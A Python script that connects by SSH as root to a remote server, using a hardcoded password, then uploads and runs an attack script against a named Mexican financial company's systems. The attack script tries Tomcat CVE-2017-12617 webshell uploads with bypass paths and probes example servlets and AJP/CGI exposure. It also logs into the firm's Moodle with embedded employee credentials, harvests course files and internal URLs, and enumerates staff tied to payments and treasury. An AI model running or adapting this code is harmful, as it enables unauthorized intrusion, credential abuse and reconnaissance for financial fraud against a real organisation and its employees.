import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, time
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


# ========================================
# 1. TOMCAT 8.5.31 — CVE-2017-12617 (PUT JSP upload)
# ========================================
sys.stdout.write("=" * 60 + "\n=== CVE-2017-12617 — JSP PUT upload ===\n" + "=" * 60 + "\n\n")

CORE = "http://core.findep.mx:8080"

# Simple JSP that outputs server info
webshell_content = '<%@ page import="java.io.*" %><%out.println("FINDEP-RCE-OK: " + System.getProperty("user.name") + " @ " + System.getProperty("os.name"));%>'

# CVE-2017-12617: PUT with trailing / to bypass JSP restriction
test_paths = [
    "/test_tr4ns.jsp/",      # Trailing slash
    "/test_tr4ns.jsp%00",    # Null byte
    "/test_tr4ns.jsp::$DATA", # NTFS ADS
    "/test_tr4ns.jsp",       # Direct
    "/test_tr4ns.jspx",      # JSPX
]

for path in test_paths:
    try:
        r = requests.put(f"{CORE}{path}", data=webshell_content,
            headers={"User-Agent": UA, "Content-Type": "application/text"},
            timeout=5, verify=False)
        sys.stdout.write(f"PUT {path} -> [{r.status_code}] ({len(r.text)}b)\n")
        
        if r.status_code in [201, 204, 200]:
            # Try to access the uploaded file
            time.sleep(0.5)
            clean_path = path.rstrip("/").replace("%00", "").replace("::$DATA", "")
            r_check = requests.get(f"{CORE}{clean_path}",
                headers={"User-Agent": UA}, timeout=5, verify=False)
            sys.stdout.write(f"  GET {clean_path} -> [{r_check.status_code}] {r_check.text[:200]}\n")
            if "FINDEP-RCE-OK" in r_check.text:
                sys.stdout.write("\n*** RCE CONFIRMED ***\n\n")
    except Exception as e:
        sys.stdout.write(f"PUT {path} -> ERR: {str(e)[:60]}\n")
    sys.stdout.flush()

# Test if PUT is enabled at all
sys.stdout.write("\nOPTIONS check:\n")
try:
    r = requests.options(f"{CORE}/", timeout=5, verify=False)
    sys.stdout.write(f"  Allow: {r.headers.get('Allow', 'N/A')}\n")
except Exception as e:
    sys.stdout.write(f"  ERR: {e}\n")

# Test DELETE too
try:
    r = requests.delete(f"{CORE}/test_delete.txt", timeout=5, verify=False)
    sys.stdout.write(f"  DELETE: [{r.status_code}]\n")
except:
    pass


# ========================================
# 2. TOMCAT EXAMPLES — EXPLOITATION
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== TOMCAT EXAMPLES EXPLOITATION ===\n" + "=" * 60 + "\n\n")

# Session example — can manipulate sessions
sys.stdout.write("--- Session Example ---\n")
try:
    r = requests.get(f"{CORE}/examples/servlets/servlet/SessionExample",
        headers={"User-Agent": UA}, timeout=5, verify=False)
    sys.stdout.write(f"  [{r.status_code}] ({len(r.text)}b)\n")
    if r.status_code == 200:
        sys.stdout.write(f"  {r.text[:500]}\n")
except:
    pass

# Cookie example
try:
    r = requests.get(f"{CORE}/examples/servlets/servlet/CookieExample",
        headers={"User-Agent": UA}, timeout=5, verify=False)
    sys.stdout.write(f"\n--- Cookie Example: [{r.status_code}] ({len(r.text)}b) ---\n")
except:
    pass

# Snoop JSP — info disclosure
try:
    r = requests.get(f"{CORE}/examples/jsp/snp/snoop.jsp",
        headers={"User-Agent": UA}, timeout=5, verify=False)
    sys.stdout.write(f"\n--- Snoop JSP: [{r.status_code}] ({len(r.text)}b) ---\n")
    if r.status_code == 200:
        # Extract server info
        server_info = re.findall(r'(?:Server|Port|Remote|Local|Method|Protocol|Path|Scheme).*?</td>', r.text, re.I | re.S)
        for si in server_info[:10]:
            clean = re.sub(r'<[^>]+>', ' ', si).strip()
            sys.stdout.write(f"  {clean[:100]}\n")
except:
    pass

# Request info
try:
    r = requests.get(f"{CORE}/examples/servlets/servlet/RequestInfoExample",
        headers={"User-Agent": UA}, timeout=5, verify=False)
    sys.stdout.write(f"\n--- RequestInfo: [{r.status_code}] ---\n")
    if r.status_code == 200:
        lines = re.findall(r'<th[^>]*>(.*?)</th>\s*<td[^>]*>(.*?)</td>', r.text, re.I | re.S)
        for th, td in lines:
            sys.stdout.write(f"  {re.sub(r'<[^>]+>', '', th).strip()}: {re.sub(r'<[^>]+>', '', td).strip()}\n")
except:
    pass

# Header example — reveals headers
try:
    r = requests.get(f"{CORE}/examples/servlets/servlet/RequestHeaderExample",
        headers={"User-Agent": UA}, timeout=5, verify=False)
    sys.stdout.write(f"\n--- Headers: [{r.status_code}] ({len(r.text)}b) ---\n")
except:
    pass

# SSI
for ssi_path in ["/examples/jsp/include/include.jsp", "/examples/jsp/forward/forward.jsp",
                   "/examples/jsp/jsptoserv/jsptoservlet.jsp", "/examples/jsp/xml/xml.jsp",
                   "/examples/jsp/jsp2/el/basic-arithmetic.jsp"]:
    try:
        r = requests.get(f"{CORE}{ssi_path}", headers={"User-Agent": UA}, timeout=5, verify=False)
        if r.status_code == 200:
            sys.stdout.write(f"  [{r.status_code}] {ssi_path} ({len(r.text)}b)\n")
    except:
        pass


# ========================================
# 3. TOMCAT VERSION-SPECIFIC CVEs
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== TOMCAT 8.5.31 CVE PROBES ===\n" + "=" * 60 + "\n\n")

# CVE-2019-0232 — CGI RCE on Windows
sys.stdout.write("--- CVE-2019-0232 (CGI RCE) ---\n")
cgi_paths = [
    "/cgi-bin/", "/cgi/", 
    "/examples/cgi-bin/printenv.bat",
    "/examples/cgi-bin/printenv.sh",
]
for p in cgi_paths:
    try:
        r = requests.get(f"{CORE}{p}", timeout=5, verify=False)
        sys.stdout.write(f"  [{r.status_code}] {p}\n")
    except:
        pass

# CVE-2020-1938 — AJP Ghostcat
sys.stdout.write("\n--- AJP port check (Ghostcat CVE-2020-1938) ---\n")
import socket
for port in [8009, 8443, 8005, 9090, 4848]:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex(("core.findep.mx", port))
        if result == 0:
            sys.stdout.write(f"  *** PORT {port} OPEN *** -> ")
            if port == 8009:
                sys.stdout.write("AJP (Ghostcat CVE-2020-1938!)\n")
            elif port == 8005:
                sys.stdout.write("Tomcat Shutdown port!\n")
            else:
                sys.stdout.write("Open\n")
        sock.close()
    except:
        pass
    sys.stdout.flush()


# ========================================
# 4. MOODLE — FINANCIAL COURSES
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== MOODLE — FINANCIAL COURSES ===\n" + "=" * 60 + "\n\n")

ms = requests.Session()
ms.verify = False
ms.headers.update({"User-Agent": UA})

MOODLE = "https://universidad.findep.mx"

# Login
r_login = ms.get(f"{MOODLE}/login/index.php", timeout=10)
logintoken = re.search(r'name="logintoken"\s+value="([^"]+)"', r_login.text)
r_auth = ms.post(f"{MOODLE}/login/index.php",
    data={"username": "aguzmango", "password": "Capacita-1",
          "logintoken": logintoken.group(1) if logintoken else ""},
    timeout=10, allow_redirects=True)

sesskey = re.search(r'"sesskey":"([^"]+)"', r_auth.text)
sk = sesskey.group(1) if sesskey else ""
sys.stdout.write(f"Moodle logged in, sesskey={sk}\n\n")

# Key financial courses to mine
financial_courses = [711, 671, 673, 894, 1307, 1298, 1303]
course_names = {711: "TRONCO COMUN APOYO FINANCIERO", 671: "RIESGO OPERATIVO",
                673: "RIESGO OPERATIVO 2022", 894: "EXPEDIENTES DIGITALES AFI",
                1307: "Colocacion Seguros", 1298: "Control Interno",
                1303: "Control Interno CONEXIA"}

for cid in financial_courses:
    sys.stdout.write(f"\n--- Course {cid}: {course_names.get(cid, '?')} ---\n")
    try:
        r = ms.get(f"{MOODLE}/course/view.php?id={cid}", timeout=10)
        if r.status_code == 200:
            # Extract activities
            activities = re.findall(r'class="instancename"[^>]*>(.*?)<', r.text)
            sys.stdout.write(f"Activities ({len(activities)}):\n")
            for a in activities:
                a_clean = re.sub(r'<[^>]+>', '', a).strip()
                if a_clean:
                    sys.stdout.write(f"  - {a_clean}\n")
            
            # Extract resource/file links (pluginfile, mod/resource, mod/url)
            resources = re.findall(r'href="([^"]*(?:pluginfile|mod/resource|mod/url|mod/page|mod/folder)[^"]*)"', r.text)
            if resources:
                sys.stdout.write(f"Resources:\n")
                for res in resources[:15]:
                    sys.stdout.write(f"  {res[:120]}\n")
            
            # Extract any embedded files (PDFs, docs)
            files = re.findall(r'href="([^"]*(?:\.pdf|\.docx?|\.xlsx?|\.pptx?|\.csv)[^"]*)"', r.text, re.I)
            if files:
                sys.stdout.write(f"*** DOWNLOADABLE FILES ***\n")
                for f in files:
                    sys.stdout.write(f"  {f[:120]}\n")
            
            # Look for internal URLs
            internal = re.findall(r'(?:https?://)?[\w.-]+\.findep\.(?:mx|com\.mx|global|dev)[\w./\-?=&]*', r.text)
            unique_internal = set(u[:100] for u in internal if 'universidad' not in u)
            if unique_internal:
                sys.stdout.write(f"FINDEP URLs:\n")
                for u in list(unique_internal)[:10]:
                    sys.stdout.write(f"  {u}\n")
    except Exception as e:
        sys.stdout.write(f"  ERR: {e}\n")
    sys.stdout.flush()

# Try to get the SCORM packages (often contain docs/procedures)
sys.stdout.write("\n\n--- SCORM packages (contain procedures) ---\n")
scorm_ids = re.findall(r'mod/scorm/view\.php\?id=(\d+)', r_auth.text)
sys.stdout.write(f"SCORM IDs in dashboard: {scorm_ids}\n")
for sid in scorm_ids[:5]:
    try:
        r = ms.get(f"{MOODLE}/mod/scorm/view.php?id={sid}", timeout=10)
        title = re.search(r'<title>(.*?)</title>', r.text[:2000], re.I)
        pkg = re.findall(r'href="([^"]*pluginfile[^"]*\.zip[^"]*)"', r.text)
        sys.stdout.write(f"  SCORM {sid}: {title.group(1)[:60] if title else 'N/A'}\n")
        if pkg:
            sys.stdout.write(f"    Package: {pkg[0][:120]}\n")
    except:
        pass

# User search — get more employees
sys.stdout.write("\n\n--- User search (employees) ---\n")
try:
    search_data = [{"index": 0, "methodname": "core_search_get_relevant_users",
        "args": {"query": "findep", "courseid": 0}}]
    r = ms.post(f"{MOODLE}/lib/ajax/service.php?sesskey={sk}&info=core_search_get_relevant_users",
        json=search_data, timeout=10)
    data = r.json()
    if isinstance(data, list) and data and not data[0].get("error"):
        users = data[0].get("data", [])
        sys.stdout.write(f"Users found: {len(users)}\n")
        for u in users[:30]:
            sys.stdout.write(f"  {u.get('fullname', '?')} ({u.get('email', '?')})\n")
    else:
        sys.stdout.write(f"  {str(data)[:300]}\n")
except Exception as e:
    sys.stdout.write(f"  ERR: {e}\n")

# Try broader user search
for query in ["spei", "pagos", "dispersi", "tesoreria", "finanzas", "contabil", "admin"]:
    try:
        search_data = [{"index": 0, "methodname": "core_search_get_relevant_users",
            "args": {"query": query, "courseid": 0}}]
        r = ms.post(f"{MOODLE}/lib/ajax/service.php?sesskey={sk}&info=core_search_get_relevant_users",
            json=search_data, timeout=10)
        data = r.json()
        if isinstance(data, list) and data and not data[0].get("error"):
            users = data[0].get("data", [])
            if users:
                sys.stdout.write(f"\n  Query '{query}': {len(users)} users\n")
                for u in users[:10]:
                    sys.stdout.write(f"    {u.get('fullname', '?')} ({u.get('email', '?')})\n")
    except:
        pass
    sys.stdout.flush()

# Moodle global search for internal procedures
sys.stdout.write("\n\n--- Global search (SPEI/disbursement) ---\n")
search_terms = ["SPEI", "dispersi", "transferencia", "pago", "STP", "CLABE",
                "contabilidad", "tesoreria", "cuentas", "operacion financiera"]
for term in search_terms:
    try:
        r = ms.get(f"{MOODLE}/search/index.php?q={term}", timeout=10)
        results_count = re.search(r'(\d+)\s+result', r.text, re.I)
        if r.status_code == 200 and results_count:
            sys.stdout.write(f"  '{term}': {results_count.group(0)}\n")
        elif r.status_code == 200:
            has_results = "search-results" in r.text.lower() and "no results" not in r.text.lower()
            sys.stdout.write(f"  '{term}': [{r.status_code}] hasResults={has_results}\n")
    except:
        pass
    sys.stdout.flush()


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_tomcat_rce.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_tomcat_rce.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
